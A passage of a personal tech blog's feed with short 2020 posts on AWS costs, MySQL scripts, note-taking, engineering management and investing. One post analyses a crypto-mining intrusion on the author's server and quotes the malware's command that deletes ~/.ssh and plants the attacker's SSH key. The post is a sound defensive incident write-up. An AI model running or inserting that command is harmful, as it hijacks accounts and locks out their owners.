<p>The focus on this intersection prevents Quibi from doing either problem well. People are not looking for one product to solve both problems and instead are willing to have a menu of choices for each.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Optimizing AWS reservations</title>
   <link href="http://dangoldin.com/2020/07/08/optimizing-aws-reservations/"/>
   <updated>2020-07-08T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2020/07/08/optimizing-aws-reservations</id>
   <content:encoded><![CDATA[
<p>The Information has <a href="https://www.theinformation.com/articles/uber-ceo-wants-to-shift-more-engineering-jobs-to-india-sparking-internal-debate">an article</a> making the case that Uber was better off having their own data centers versus relying on the cloud given the impact of COVID but that would depend on their reservation strategy. Sure if they reserved AWS capacity then they would be on the hook. Alternatively, if they had no reservations and were running everything on demand they would have incurred higher previous costs but would immediately be able to shut things down. This got me thinking about the optimal reservation strategy - the reality is that this depends very much on your business and the ability to forecast but this is an interesting exercise in speculation.</p>

<p>The best thing is to use spot instances if you can. They can give you up to a 90% (usually around 75%) discount versus the on demand price. That’s an incredible deal since a 3 year fully upfront reservation will give you a 65% discount. It may not be easy to have your application run off of spot instances but if compute costs are a significant factor then it may be a worthwhile endeavour.</p>

<p>If spot instances are not doable you then get into the complex world of reservations. AWS gives you a few dimensions to play with - reservation duration (1 or 3 years), payment method (no upfront payment, partial upfront payment, or an entirely upfront payment), and the <a href="https://docs.aws.amazon.com/whitepapers/latest/cost-optimization-reservation-models/standard-vs.-convertible-offering-classes.html">convertible vs standard distinction</a>.</p>

<p>Those that can forecast their workload perfectly can choose the optimal reservation for them but for the rest of us it’s not that simple. On one extreme you can go on demand and pay a fairly significant premium (~33% above the standard, 1 year, no upfront option) for the flexibility but that’s a large price to pay.</p>

<p>A worthwhile option is to use the existing marketplace where you buy partially used reservations from other companies and not Amazon. This gives you the ability to buy non-standard durations and craft a strategy that makes sense for your workload. One idea might be to stagger your reservations over the course of a year so you’re reserving a twelfth of your desired capacity every month. That gives you flexibility in your reservations and gives you the option to not renew in increments - a useful ability these days. Of course you then have to manage a much more complicated policy but nothing comes easy.</p>

<p>The summary is that reservations can be made as complex as you want and the more you can forecast and understand your risks the more power you will have in finding an approach that works. AWS gives a variety of levers to play with but you need to know your business to take advantage.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Overthinking how to load data into MySQL</title>
   <link href="http://dangoldin.com/2020/06/30/overthinking-how-to-load-data-into-mysql/"/>
   <updated>2020-06-30T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2020/06/30/overthinking-how-to-load-data-into-mysql</id>
   <content:encoded><![CDATA[
<p>I have two projects that generate data to dump into my <a href="/2020/02/27/my-personal-grafana-dashboard/">personal dashboard</a>. One <a href="https://github.com/dangoldin/health-stats">loads the health export</a> from my Apple watch into MySQL and the other <a href="https://github.com/dangoldin/blog-analytics">analyzes my blog posts</a> and generates a CSV file of statistics that I then load into MySQL. The input to both is basically the same - either a file or a directory - and yet two different approaches to the processing.</p>

<p>The blog analytics script doesn’t depend on any third party libraries and just generates a CSV file that can then be loaded into MySQL through a query. The health stats script, on the other hand, connects to MySQL and handles the insertions incrementally. As you can guess the health script depends on an external library to make the connection to MySQL as well as a small library to handle some time zone logic.</p>

<p>I subscribe to the Unix philosophy of having programs do one thing but do it well. The first program follows this model. Yet it’s less functional than the latter, it has no support for incremental logic and I have to run a separate SQL command to load the CSV file. The second program, on the other hand, handles the entire process end to end.</p>

<p>The “Unix way” would be to split each bit of functionality into individual scripts that can be chained together. The first program can then be executed as “python3 analyze.py ~/blog/_posts out.csv &amp;&amp; execute_sql {query}” and the second as “get_sql_field {get_max_date_query} | python3 get_health.py export.xml | execute_sql {query}”. Neither of these feel particularly elegant since the commands feel bloated and not very easy to follow. There’s also the mixture of SQL and CSV - how functional is a program that generates SQL but doesn’t actually execute it? Is that really a self contained script?</p>

<p>It all goes to show that there are multiple ways of solving problems and there’s rarely a single obvious solution. Solutions are meant to solve problems and every problem is unique. At the moment I’m partial to having a personal library of common SQL that I can tap into - it’s a middle ground between the two approaches and allows me to get some reusability.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Specify versions in technical blogging</title>
   <link href="http://dangoldin.com/2020/06/28/specify-versions-in-technical-blogging/"/>
   <updated>2020-06-28T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2020/06/28/specify-versions-in-technical-blogging</id>
   <content:encoded><![CDATA[
<p>I’ve been getting back into coding by hacking around on some side projects and am definitely rusty. Lately it’s been learning the modern Django stack and discovering it’s multiple major versions ahead of the last time I used it. But thanks to the wonders of the modern internet there’s a ton of content online that explains how to do certain tasks. Stack Overflow is one but there are also a ton of individual bloggers and tutorials that make it easier than ever to answer questions.</p>

<p>What’s rare is for these posts to specify the versions of the software they’re describing. If I’m writing a post about a problem I’m running into I’m likely running the latest version of the library and it’s implied that my post is about that. Unfortunately, if someone discovers that post months or years later it may be entirely out of date and the suggestion being limited to the author’s version. My workaround to this has been to either look for any links to actual repository code or to look at the date the article was written in order to determine whether it may still be relevant.</p>

<p>It’s surely a first world problem but especially for technical writing including the version information will be a huge help to the audience. Especially if that information ends up becoming somehow searching or filterable. Imagine if every time you tried searching Google or Stack Overflow for technical help you were able to limit them to the versions you’re using. In many cases it would be too limiting but even knowing the version the author used would be incredibly helpful.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>AWS Snowcone and my first job</title>
   <link href="http://dangoldin.com/2020/06/19/aws-snowcone-and-my-first-job/"/>
   <updated>2020-06-19T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2020/06/19/aws-snowcone-and-my-first-job</id>
   <content:encoded><![CDATA[
<img src="http://dangoldin.com/assets/static/images/ait-tapes.jpg" alt="AIT tapes" width="640" height="480" layout="responsive"/>
<p class="caption"><a href="https://en.wikipedia.org/wiki/Advanced_Intelligent_Tape">AIT Tapes on Wikipedia</a></p>

<p>AWS recently launched <a href="https://aws.amazon.com/snowcone/">Snowcone</a> and it immediately reminded me of my first post-college job. I was a “Business Information Specialist” at ZS Associates, a consulting company with a strong emphasis on leveraging data to support pharmaceutical companies. The industry was setup in such a way that there were these massive vendors that would aggregate pharmaceutical prescription data from pharmacies, trace them to the prescriber (ie doctor), and then sell these back to the pharmaceutical companies. In turn, the pharmaceutical companies would give us this data to run a variety of analyses - ranging from calculating sales rep commissions, to setting their quotas, to identifying off-label prescriptions.</p>

<p>At the time, we would receive these data dumps via magnetic tapes and it was one of my tasks to load this data into a tape reader, run a series of cryptic commands on a central computer, and then start the analyses. We all had the fear of doing something wrong when we were reading the tape which would require someone more experienced to save. I don’t recall how large these files were but given it was 2005 I doubt they were more than a few hundred gigabytes. These days I’d be shocked if it’s not just transferred digitally - and even more likely it’s just processed in the cloud.</p>

<p>It’s quite incredible how far we’ve come. I’m constantly reminded that every generation of software engineer gets further up in abstraction. I never had to deal with interrupts or deal with low level network problems. Yet engineers these days rarely have to deal with physical storage or limited computation resources. We all stand on the shoulders of giants.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>AWS 101</title>
   <link href="http://dangoldin.com/2020/06/19/aws-101/"/>
   <updated>2020-06-19T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2020/06/19/aws-101</id>
   <content:encoded><![CDATA[
<p>Earlier this week I hosted an “AWS 101” session at work. The goal was to give a small group an interactive introduction to the primary AWS services over 90 minutes. I figure I’d share our agenda and exercises in case they’re helpful to anyone else. We had trouble sticking to the times but the fact that everyone was remote did make it easier to do group-debugging with those stuck sharing their screens.</p>

<ul>
  <li>Introduction to Cloud Computing and AWS
    <ul>
      <li>What is Cloud Computing?</li>
      <li>How is it different/better than running your own data center?</li>
      <li>Regions and Availability Zones</li>
    </ul>
  </li>
  <li>The AWS Console
    <ul>
      <li>Highlight the breadth of services and how to navigate the console</li>
    </ul>
  </li>
  <li>Common AWS Services (Interactive)
    <ul>
      <li>EC2: “Launch an instance”
        <ul>
          <li>Specific OS, Instance Type, VPC, Security Group, and Storage</li>
          <li>SSH into the instance and install Apache</li>
          <li>Go to the Public DNS and you should see the default Apache page</li>
          <li>Notes: To make this work you need to make sure that you’ve set up the appropriate VPC and Security Group. These should have a Public IP address and have ports 22 (SSH) and 80 (HTTP) open within the Security Group. The point of the apache installation is to show something tangible and not just something visible in the AWS Console.</li>
        </ul>
      </li>
      <li>S3: “Create a bucket and upload a publicly accessible file”
        <ul>
          <li>Notes: This took a bit of time to get right since S3 has a variety of ways to make this happen. We took the lazy route and made the bucket policy open and then modified the file publicly available.</li>
        </ul>
      </li>
      <li>RDS: “Launch a MySQL instance”
        <ul>
          <li>Specific version, instance class, and storage size</li>
          <li>Notes: In hindsight I would have skipped this step since the instances took too long to spin up and AWS throttled us in our test account. In addition, there’s nothing tangible after this without users logging in and that would require installing a MySQL client. It would have been better to make this part of a future session and have it be a part of an end-to-end LAMP app.</li>
        </ul>
      </li>
      <li>Route 53: “Create a CNAME record to point to your EC2 instance”
        <ul>
          <li>Notes: This was a straightforward one and if someone was able to get the EC2 instance setup in the first step they were able to get a human readable domain name. I wanted to avoid registering another domain to save the $10 and setup subdomain delegation across accounts by pointing to the appropriate nameservers.</li>
        </ul>
      </li>
    </ul>
  </li>
</ul>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Software defined photography</title>
   <link href="http://dangoldin.com/2020/06/15/software-defined-photography/"/>
   <updated>2020-06-15T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2020/06/15/software-defined-photography</id>
   <content:encoded><![CDATA[
<p>I was talking to a coworker earlier today about the ridiculous quality of today’s smartphone cameras. He pointed out how it’s becoming more and more difficult for professional photographers to charge what they have been. The parallel here is how the invention of photography. That completely destroyed the value of artists and yet led to the launch of the modern art movements - Impressionism, Surrealism, Data, and countless others. Without photography would these have happened?</p>

<p>The more interesting point to me was how the quality is not solely due to the camera but also due to the software. There’s a ton of computer vision behind the scenes to create the beautiful shots - especially being able to choose the various photo styles, filters, and lighting modes. That’s not just the camera working but the massive investment in the software. It’s difficult to find how much code is built into the operating systems to support the cameras but it can’t be trivial and grows with every new release. I’d love to see a breakdown of the code in stock Android and stock iOS and grouped by the functionality it supports.</p>

<p>Software changed the way we do <a href="https://en.wikipedia.org/wiki/Software-defined_networking">networking</a> and software is changing the way we do photography.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Dark Mode is for when you run out of real features</title>
   <link href="http://dangoldin.com/2020/06/11/dark-mode-is-for-when-you-run-out-of-real-features/"/>
   <updated>2020-06-11T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2020/06/11/dark-mode-is-for-when-you-run-out-of-real-features</id>
   <content:encoded><![CDATA[
<p>I’ve seen a lot of apps launch dark mode and I just don’t get it. I’m sure part of it is that I mostly stick to the default settings but I can’t help but think that if someone is prioritizing dark mode then they must have run out of actually useful features to build. I’m being a bit unfair since dark mode can also be a fun side project that someone picks up and may only require changing a few colors around but if it’s anything more than that it’s an indicator that something is off with their prioritization. Unless a product has reached the mature stage there are incredibly valuable things that the team can be investing in that actually improve the workflow and experience for their customers - dark mode is rarely that.</p>

<p>Yet there was a period where nearly every app decided to introduce dark mode within the span of a few weeks. Maybe there’s a vocal minority of users that pushed for this but I suspect the vast majority of users don’t care about dark mode at all and would rather have a faster and more thoughtfully designed application.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Catch up with your former coworkers</title>
   <link href="http://dangoldin.com/2020/06/10/catch-up-with-your-former-coworkers/"/>
   <updated>2020-06-10T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2020/06/10/catch-up-with-your-former-coworkers</id>
   <content:encoded><![CDATA[
<p>It used to be the case that people used to work at a company for decades, some even retired at the same company they started working at. We’re no longer in that world. These days it’s rare to find someone who’s worked at a company for longer than 5 years.</p>

<p>There is a benefit to this rotation though: when people change jobs they also bring their ideas and experiences, mix them with those at their new company, and converge to better and better approaching. A great way to accelerate this is by reaching out to all of your coworkers a few months after they left and asking how they’re doing. It’s a great way to stay in touch and maintain that relationship but it’s also a good opportunity to compare and contrast how they do things. They would have left recently enough where they understand your processes and embedded enough in their new roles to know how things work there. Those differences give you a lot of valuable advice on what other companies are doing and whether there’s anything you should change on your end.</p>

<p>There is always something you can be doing better and former coworkers are great at identifying those areas. It’s surprising how rarely people reach out to their former coworkers but it’s one of the best ways to get concrete and relevant feedback. And this is a network that only gets larger the longer you work. Don’t squander it.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Black Lives Matter</title>
   <link href="http://dangoldin.com/2020/06/06/black-lives-matter/"/>
   <updated>2020-06-06T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2020/06/06/black-lives-matter</id>
   <content:encoded><![CDATA[
<p>It’s difficult to think of or write about anything other than the protests going on right now. I hope that everything going on is a necessary step to get the United States to accept its sordid treatment of Black people and into a more fair and equal world. The past few weeks have made race come to the foreground as a topic that must be discussed. In the past I shied away from discussing anything race related; especially coming from my privileged background and despite my intent I was worried about the language I used and concerned about being misinterpreted. Given how pervasive and obvious Black mistreatment is it’s not something that anyone can be silent about. It’s critical for those of us that don’t know about what’s going on to educate ourselves and have the real and honest and often painful conversations. Those in turn will spur action which will lead to us finally tackling the nearly 500 year history of Black oppression.</p>

<p>At work I send a weekly note to the engineering team and this week was focused on resources that can help those unfamiliar with the challenges of being Black in the United States to get educated and I wanted to share them here as well.</p>

<ul>
  <li>Trevor Noah shares his thoughts on the breaking of the societal contract: <a href="https://www.youtube.com/watch?v=v4amCfVbA_c">https://www.youtube.com/watch?v=v4amCfVbA_c</a></li>
  <li>conversation between a former police officer and a criminal justice reformer that covers growth of the police state: <a href="https://a16z.com/2020/06/03/what-we-cant-reveal-we-cant-heal-transparency-technology-media/">https://a16z.com/2020/06/03/what-we-cant-reveal-we-cant-heal-transparency-technology-media/</a></li>
  <li>Short post on showing empathy in these times: <a href="https://link.medium.com/MhxpMexYX6">https://link.medium.com/MhxpMexYX6</a></li>
  <li>Interactive series reframing 1619 as the birth of the US and the implications of building the nation on top of slavery: <a href="https://www.nytimes.com/interactive/2019/08/14/magazine/1619-america-slavery.html">https://www.nytimes.com/interactive/2019/08/14/magazine/1619-america-slavery.html</a></li>
</ul>

<p>The following are all books that came recommended. I read the last two and am going through the others on the list.</p>

<ul>
  <li><a href="https://www.ibramxkendi.com/how-to-be-an-antiracist-1">How to Be an Antiracist</a> (I just started reading this)</li>
  <li><a href="https://www.sealpress.com/titles/ijeoma-oluo/so-you-want-to-talk-about-race/9781580056779/">So You Want to Talk About Race</a></li>
  <li><a href="https://nyupress.org/9781479837243/algorithms-of-oppression/">Algorithms of Oppression</a></li>
  <li><a href="https://www.penguinrandomhouse.com/books/190696/the-warmth-of-other-suns-by-isabel-wilkerson/">The Warmth of Other Suns</a></li>
  <li><a href="https://newjimcrow.com/about">The New Jim Crow</a></li>
</ul>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Giving Obsidian a shot</title>
   <link href="http://dangoldin.com/2020/05/31/giving-obsidian-a-shot/"/>
   <updated>2020-05-31T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2020/05/31/giving-obsidian-a-shot</id>
   <content:encoded><![CDATA[
<p>I tried using Notion a while back but rebelled against having my data stored in the cloud in a proprietary format. For a <a href="/2016/04/30/text-is-king/">variety of reasons</a> I want my notes to be available locally in a text based format. At the same time there’s a lot to like about the modern tools and I feel myself being worn down. A few weeks ago I discovered <a href="https://roamresearch.com/">Roam</a> and am sold on its networked thought model. I’ve been using it for some of my note taking but was hesitant to commit given my concerns. Earlier this week I came across <a href="https://obsidian.md/">Obsidian</a> - a Roam-like product that runs locally and stores everything in Markdown. This was opportune timing since I’m able to lean in on the networked thought model while still staying true to local files in an open format. I’m still getting used to Obsidian’s semantics - tags, links, and Markdown - but overall I’m bullish and glad to give it a shot.</p>

<p>Obsidian is also a great example of why I keep my notes in a text format. All I had to do to get them into Obsidian was run find . -name “*.txt” -exec rename ‘s/.txt$/.md/’ ‘{}’ \; which replaced the .txt extension with .md for every file in my notes folder. This just would not have been possible had my notes been stored in the cloud in some proprietary format. Similarly, since Markdown is itself open and I can easily go back to plaintext - although I will likely need to do a bit of scripting to actually clean up the files.</p>

<p>I understand that adopting a proprietary format can improve the product it’s often a form of lockin that I’m just not willing to accept. I wish more people had this mindset so we’d see less cloud software and more open desktop software - especially for sensitive use cases.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Three categories of software engineering work</title>
   <link href="http://dangoldin.com/2020/05/30/three-categories-of-software-engineering-work/"/>
   <updated>2020-05-30T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2020/05/30/three-categories-of-software-engineering-work</id>
   <content:encoded><![CDATA[
<p>Managers love frameworks to help think through problems and I’m no different. While trying to think of a way to reason through our engineering work I started grouping it into three major categories:</p>

<p><strong>Should have been done yesterday</strong>. Self explanatory but these are the items that as soon as you discover them you wish they had already been done. Critical bugs and issues fall into this but also product oversights that you wish you caught earlier.</p>

<p><strong>Has a deadline</strong>. Deadlines are an interesting topic and they only exist as much as you want them to. There are true deadlines - imagine wanting to release something in time for the Superbowl or South by Southwest - but more often they are self imposed in order to hit a specific date. A weak reason is to motivate a team but a better reason is to hit a launch date. In that case customers, partners, and other departments are involved and a delay would cause ripple effects across everyone involved.</p>

<p><strong>Important but can slip</strong>. This is the work that’s important but not urgent. A delay of a week here or there will not determine the success of this project and will not have significant ripple effects. These are often infrastructure related with the goal of investing in the foundation for future work.</p>

<p>It’s useful to look at the work your team is doing and grouping it into those categories. If you have too much of the first it’s likely your team is either understaffed or not planning effectively. If you have too much in the middle bucket you’re likely not investing enough in the future and accruing unhandled tech debt. Too much in the last one and you may not be focused on customer facing products.</p>

<p>There is no correct distribution since it will vary from company to company and industry to industry but it is useful to track and understand the work. Companies that are more service oriented and have many enterprise contracts may have a higher proportion of deadline driven work. Companies that are more consumer focused may have most of their work in the important but not urgent bucket.</p>

<p>What is valuable is to see if you can shift work from one bucket to another. If a project has deadlines due to the multi-team effort involved is it possible to reorganize the teams so that it can be done by fewer teams? If you’re constantly discovering work that should have been done yesterday is there a way to identify the pattern in these interruptions and build a product to make them go away? It may not be possible but having a framework gives you a tool to at least think through options and may engender some valuable thoughts.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Anatomy of a crypto mining hack</title>
   <link href="http://dangoldin.com/2020/05/29/anatomy-of-a-crypto-mining-hack/"/>
   <updated>2020-05-29T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2020/05/29/anatomy-of-a-crypto-mining-hack</id>
   <content:encoded><![CDATA[
<p>A few months ago I set up a simple ftp server to help a friend. I took a few security shortcuts which came to bite me this week when I received an alert from DigitalOcean that an instance was running hot.</p>

<img src="http://dangoldin.com/assets/static/images/digitalocean-cpu-alert.png" alt="DigitalOcean CPU Alert" width="503" height="280" layout="responsive"/>

<p>I dug into it and noticed a series of processes being run by the ftp_user - the most impactful was a command called rsync. I’m familiar with rsync which syncs files across devices - and this was nothing like that. At this point I realized that I got hacked and quickly disabled the user and killed all its processes. The CPU usage dropped back to normal and now it was time to dig into the damage.</p>

<p>Note that I’m far from a security engineer but am reasonably comfortable on the command line. The user was not a sudo account and this was a non critical instance so I wasn’t too worried about the impact. In fact, I actually enjoyed the exercise of digging in and trying to see how I was hacked and how the entire script worked.</p>

<p>The origin of the hack was that I was sloppy when I created the ftp account and gave it both a weak password and didn’t disable password-based authentication for SSH. This led to the attacker brute forcing the password and getting access to the ftp_user’s home folder on the instance. Once there, the attacker downloaded a bunch of code that both embedded itself in the system and then started running a miner.</p>

<p>Before I got rid of the code I took the liberty of committing it to <a href="https://github.com/dangoldin/crypto-miner-hack">GitHub</a> in order to preserve and share with others. That also gave me the time to dig in and see how it actually worked.</p>

<p>One of the first things I noticed was how obfuscated the code was. The file names and folders were either named after existing programs or were hidden files and directories. In addition, the names were completely nonsensical and intricately linked which made it difficult to trace the execution. I didn’t go through the code step by step by digging into the files and found a few interesting tidbits.</p>

<p>One was that the <a href="https://github.com/dangoldin/crypto-miner-hack/blob/69fae2599bff579e7c159c984c6a9e9087b22378/ftp_user/.configrc/b/run#L5">code created</a> a cron job that would wipe the .ssh folder and then add a single ssh key - thereby locking every other user out.</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nb">cd</span> ~ <span class="o">&amp;&amp;</span> <span class="nb">rm</span> <span class="nt">-rf</span> .ssh <span class="o">&amp;&amp;</span> <span class="nb">mkdir</span> .ssh <span class="o">&amp;&amp;</span> <span class="nb">echo</span> <span class="s2">"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"</span><span class="o">&gt;&gt;</span>.ssh/authorized_keys <span class="o">&amp;&amp;</span> <span class="nb">chmod</span> <span class="nt">-R</span> <span class="nv">go</span><span class="o">=</span> ~/.ssh</code></pre></figure>

<p>Another was that there was a <a href="https://github.com/dangoldin/crypto-miner-hack/blob/69fae2599bff579e7c159c984c6a9e9087b22378/ftp_user/.configrc/a/init0">script to kill</a> other miners. I assume the motivation here was to realize that if this instance was dumb enough to get hacked then it was probably hacked by someone else already so let’s put a stop to that.</p>

<p>The most interesting part was an <a href="https://github.com/dangoldin/crypto-miner-hack/blob/69fae2599bff579e7c159c984c6a9e9087b22378/ftp_user/.configrc/b/run#L4">encoded string</a> that was passed into the Perl interpreter. The first step decoded it into a highly obfuscated Perl program and the <a href="https://github.com/dangoldin/crypto-miner-hack/blob/master/ftp_user/.configrc/b/run_2_safe_obfuscated">subsequent step</a> executed it through an eval. The <a href="https://github.com/dangoldin/crypto-miner-hack/blob/master/ftp_user/.configrc/b/run_3_safe_decoded">code itself</a> is fascinating and those more knowledgeable <a href="https://malware.news/t/dota-campaign-analyzing-a-coin-mining-and-remote-access-hybrid-campaign/30326">figured out</a> it was connecting and listening to commands from an IRC server.</p>

<p>There’s a fascinating amount of research one can do here to understand everything the hackers managed to do and yet it’s a world most of us are only tangentially aware of. There are clear lessons here. One is to take security seriously even if it is a toy project - in this case both a strong password and limiting password-based SSH would have stopped the hack. The other is that even simpler monitoring is a huge help. If DigitalOcean had not sent me the alert my instance would still be mining cryptocoins. And the last one is that running a honeypot is an insightful experience and gives you a chance to learn something new and flex those debugging muscles.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Metrics, logging, and error reporting</title>
   <link href="http://dangoldin.com/2020/05/27/metrics-logging-and-error-reporting/"/>
   <updated>2020-05-27T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2020/05/27/metrics-logging-and-error-reporting</id>
   <content:encoded><![CDATA[
<p>As software engineers it’s vital to understand how our applications are performing. The more information we have the better we can address problems, improve performance, and generally better solve problems for our customers. Imagine releasing a product with nothing being collected - you’d be flying blind.</p>

<p>I’m a huge advocate for measuring application performance in terms of business metrics and aligning it as much with the customer experience as possible. This post does not go into that. Instead, I want to share my beliefs around measuring the technical application performance. In my mind, they’re grouped into three major categories: metrics, logging, and error reporting. There is some overlap but I find it a helpful way to think about them.</p>

<h3 id="metrics">Metrics</h3>

<p>Metrics are by far the most useful. This ranges from the business metrics but also includes the performance of the code itself. How long do things take to run? How are the instances performing? What is the distribution of status codes? Being able to surface this data visually in a way that’s easy to explore is one of the most important things you can do to improve the performance of your application. Having a visual representation of what your code is doing is empowering and you will immediately see problems when an existing pattern is broken. These dashboards start simple but if you invest in instrumenting your code you will end up with the ability to debug most issues without having to look at anything else. My go to tools here are <a href="https://prometheus.io/">Prometheus</a> and <a href="https://grafana.com/">Grafana</a>.</p>

<h3 id="logging">Logging</h3>

<p>I want to like logging but it’s the least useful bit of instrumentation one can do. It’s useful during development but once an application is deployed the other instrumentation pillars end up providing more value. There will be times when you need to add temporarily detailed logging to debug an issue but logging is difficult to get right. If you collect too little it adds very little value over metrics and if you collect too much it ends up being inaccessible and costly. Especially in a high volume and distributed system logging ends up being a burden rather than a help.</p>

<h3 id="error-reporting">Error reporting</h3>

<p>This seems underrated but I’m a huge fan of tools like <a href="https://sentry.io/">Sentry</a> that hook into your error/exception handling code and give you descriptive context and stack traces. Especially if you take every error seriously and work tirelessly to reduce the noise your code will become more and more robust. This also takes advantage of our ability to spot anomalies since novel errors will become obvious especially if they come after a release. We build complex systems and errors are inevitable but building a culture that takes each one seriously is not. The more a team cares about the quality of their code the more eager they are to eliminate errors.</p>

<p>Each of the above serves a slightly different purpose and I didn’t even go into distributed tracing but if I were to rank them I would go with metrics, then error reporting, and then logging. The more accessible the tool the more helpful it will become.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Stock portfolio hedging during the coronavirus pandemic</title>
   <link href="http://dangoldin.com/2020/05/23/stock-portfolio-hedging-during-the-coronavirus-pandemic/"/>
   <updated>2020-05-23T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2020/05/23/stock-portfolio-hedging-during-the-coronavirus-pandemic</id>
   <content:encoded><![CDATA[
<p>I have had the majority of my liquid wealth invested in the stock market and I wanted to share what I’m doing these days. As a bit of a background, at the beginning of the year my portfolio primarily consisted of the tech companies I’ve held for years - Netflix, Amazon, Equinix, Google, and Facebook. After the first decline I liquidated about half of my portfolio - my thinking was that I’m still long term bullish about these companies and they will likely emerge stronger but I should hold on to some of my gains and have a bit of cash.</p>

<p>At the same time, I wanted to do something to hedge against the market. My motivation was not to profit as much as add protection in case of a market drop. That’s a good thing since despite the awful unemployment numbers and the decline in consumer spending the S&amp;P seems to be getting close to its value at the start of the year - as if nothing catastrophic has happened.</p>

<p>The approach I took was to buy a variety of Out of the Money put options on the S&amp;P. Options give you the right to buy (call) or sell (put) the underlying stock at a particular price point by a particular point in time (with some nuance around European vs American style). The general idea is that it can be very cheap to buy for low probability events since the likelihood of them happening is very low. And if these events do happen you end up with a very nice return.</p>

<p>My put options are all on the S&amp;P at multiple strike prices and expiration times: June at $180, July at $180, and September at $195. I purchased these a month or so ago and am down over 60% - but that’s the cost of hedging. In hindsight I should have paid the premium to buy longer term options rather than the ones that are one or two months out. Right now I’m going to take the loss on the June and maybe the July options and simply extend the expiration. I’m willing to take the potential loss - my thinking is that if things do work out then it’s great to be back to normal and this was a small price to pay for that return. But if things get worse it’s nice to have some form of a hedge.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Shopify for food delivery</title>
   <link href="http://dangoldin.com/2020/05/21/shopify-for-food-delivery/"/>
   <updated>2020-05-21T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2020/05/21/shopify-for-food-delivery</id>
   <content:encoded><![CDATA[
<p>I wrote about the idea of a service that <a href="http://dangoldin.com/2018/11/29/a-delivery-aggregation-service/">aggregates delivery drivers</a> back in 2018 but given the latest wave of food delivery service bashing I couldn’t help but think of it again. This time around my thoughts are a bit more refined about how to actually build a business but do think there’s a real opportunity here, especially after seeing the challenges with the current model.</p>

<p>The existing food delivery apps charge high fees because food delivery is one of the highest costs. That’s the part that needs to be improved in order for the companies to make sense. As many people note restaurants have been delivering food on their own for decades while maintaining profitability so it’s clearly possible. Yet these online services struggle. Instead of focusing on the delivery side they’re in a race to capture as much of the demand as possible.</p>

<p>What if instead there was a focus on aggregating the delivery infrastructure in order to make the delivery network as efficient as possible. The goal would not be to drive demand to restaurants but instead to integrate with restaurants in order to provide a single delivery network that could be optimized globally.</p>

<p>One way to think about it is ordering from Amazon - you can pick a completely random assortment of objects and yet Amazon is able to orchestrate the delivery into as few packages as possible and have them delivered within days of one another. That’s incredible. But they’re only able to do it because they have the scale to make it possible. Another way to think about it is how Shopify allows anyone to launch an ecommerce site while handling the logistics on the backend. Consumers are dealing with the site itself and have no knowledge that the heavy-lifting is handled by Shopify. Using this analogy, the food delivery services are all Amazon and there’s an opportunity in building the Shopify for food delivery.</p>

<p>There are quite a few companies out there working on this - <a href="https://www.olo.com/">Olo</a>, <a href="https://get.chownow.com/">ChowNow</a>, and <a href="https://pos.toasttab.com/products/toast-delivery-services">Toast</a> all come to mind - but they’re looking at delivery as a feature rather than treating it as the primary product.</p>

<p>It’s an incredibly complex space but I’m surprised that none of these restaurant-logistics focused companies have a user facing portal. It’s true that their core product is not focused on demand aggregation and yet it would be valuable to restaurants. They would not need to charge any of the markup the existing food delivery services charge since they’d be making money on the backend and do not have to worry about manipulating the results for profit. Instead, they can avoid the gimmicks and just allow searching by name with standard sorting and filtering. Given how much restaurants are being charged this would be an easy win for them.</p>

<p>If you go to a typical restaurant you will notice drivers from GrubHub, DoorDash, and UberEats all waiting to pick up food at the same time. That’s inefficient! Instead these drivers should be picking up at places that would lead to a global optimum. This can only happen if there’s visibility into every order and this service should exist.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Prefer verbs to adverbs</title>
   <link href="http://dangoldin.com/2020/05/21/prefer-verbs-to-adverbs/"/>
   <updated>2020-05-21T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2020/05/21/prefer-verbs-to-adverbs</id>
   <content:encoded><![CDATA[
<p>Years ago I read a book that I unfortunately can’t recall that had a very insightful bit of writing advice - prefer verbs to adverbs. The premise was that many of us will spice up our writing by using adverbs to decorate our verbs but instead we should use strong and unique verbs. Your writing gains pithiness and leads to a more memorable message.</p>

